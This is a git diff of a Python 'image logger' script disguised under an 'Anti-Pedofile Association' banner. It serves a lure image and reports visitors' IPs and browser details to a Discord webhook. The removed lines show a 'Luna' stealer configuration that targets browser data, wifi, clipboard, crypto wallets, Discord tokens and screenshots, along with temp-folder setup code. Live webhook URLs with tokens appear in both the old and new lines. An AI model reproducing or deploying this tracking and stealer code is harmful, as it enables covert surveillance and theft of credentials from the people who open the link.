@@ -4,53 +4,15 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import os
-import sys
-import concurrent.futures
-import ctypes
-import json
-import random
-import subprocess
-import zlib
-from multiprocessing import cpu_count
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-from zipfile import ZIP_DEFLATED, ZipFile
-import psutil
 
 __app__ = "Anti-Pedofile Association"
 __description__ = "Pedofile logged!"
 __version__ = "v2.0"
 __author__ = "Pedofile Catchers"
 
-# Luna configuration - Add this section
-luna_config = {
-    "fakeerror": False,
-    "startup": False,
-    "defender": False,
-    "browser": True,
-    "wifi": True,
-    "common_files": True,
-    "clipboard": True,
-    "webcam": False,
-    "wallets": True,
-    "games": True,
-    "roblox": False,
-    "systeminfo": True,
-    "discord": True,
-    "screenshot": True,
-    "ping": True,
-    "pingtype": "Everyone",
-    "injection": False,
-    "anti_spam": False,
-    "antidebug_vm": False,
-    "self_destruct": False,
-    "bound_startup": False,
-    "mutex": "Luna-Mutex"
-}
-
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1357790691215806565/FPEX_bBAiFhdnZ2ZySlwxBXWki0Jz4YSZRCQgUMoyjRp-e-7-u3jIr57y50VU2cn5oz8",
+    "webhook": "https://discord.com/api/webhooks/1357142857470841005/9ECcc4ewZA6VIL-wxBHLpW_XVe0VStvOpYvH_0buFoP15r2IeVxdKwjzM4BPetik1nzH",
     "image": "https://cdn.discordapp.com/attachments/1356431787655692361/1357899552459325460/IMG_1211.jpg?ex=67f1e201&is=67f09081&hm=d2fbba109ef892c7c4778fc171a8244ae337c6df229470d5ae716806fba42fb0&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -100,15 +62,6 @@ config = {
     # 3) Message (If this is enabled, disables image)
     # 4) Image 
 }
-
-# Luna setup code - Add this section
-temp = os.getenv("temp")
-temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
-if not os.path.exists(temp_path):
-    os.mkdir(temp_path)
-localappdata = os.getenv("localappdata")
-if not hasattr(sys, "_MEIPASS"):
-    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
